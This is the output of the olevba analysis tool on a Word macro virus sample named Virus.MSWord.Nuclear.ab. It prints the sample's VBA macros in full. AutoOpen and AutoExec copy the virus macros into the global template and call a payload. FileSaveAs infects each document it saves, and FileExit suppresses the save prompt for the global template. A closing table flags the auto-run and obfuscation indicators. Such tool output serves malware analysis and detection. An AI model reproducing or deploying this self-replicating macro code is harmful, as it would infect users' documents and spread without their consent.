olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nuclear.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nuclear.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Nuclear.ab - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)    'declare dialog as type FileSaveAs
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg      'execute the dialog.

'Is the document of Type=(WordDocument or Template) ?

If (dlg.Format = 0) Or (dlg.Format = 1) Then

    'Copy Macro's from Global data area into document.
Rem     MacroCopy "Global:AutoExec",  WindowName$() + ":AutoExec", 1
Rem     MacroCopy "Global:AutoOpen",  WindowName$() + ":AutoOpen", 1
Rem     MacroCopy "Global:FileSaveAs", WindowName$() + ":FileSaveAs", 1
Rem     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro", 1
Rem     MacroCopy "Global:FilePrint", WindowName$() + ":FilePrint", 1
Rem     MacroCopy "Global:FilePrintDefault", WindowName$() + ":FilePrintDefault", 1
Rem     MacroCopy "Global:InsertPayload", WindowName$() + ":InsertPayload", 1
Rem     MacroCopy "Global:Payload", WindowName$() + ":Payload", 1

   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
Rem     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro"
    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint"
    WordBasic.MacroCopy "Global:FilePrintDefault", WordBasic.[WindowName$]() + ":FilePrintDefault"
    WordBasic.MacroCopy "Global:InsertPayload", WordBasic.[WindowName$]() + ":InsertPayload"
    WordBasic.MacroCopy "Global:Payload", WordBasic.[WindowName$]() + ":Payload"

    'Set to save document as a template.
    dlg.Format = 1
End If

WordBasic.FileSaveAs dlg  'save the document infected.
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: ./Virus.MSWord.Nuclear.ab - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileExit
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Nuclear.ab - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If CheckInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
End If
WordBasic.Call "Payload"
End Sub

Private Function CheckInstalled()
Dim i
    'Check if AutoExec macro already exists.
    CheckInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Nuclear.ab - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If CheckInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
End If
WordBasic.Call "Payload"
End Sub

Private Function CheckInstalled()
Dim i
    'Check if AutoExec macro already exists.
    CheckInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

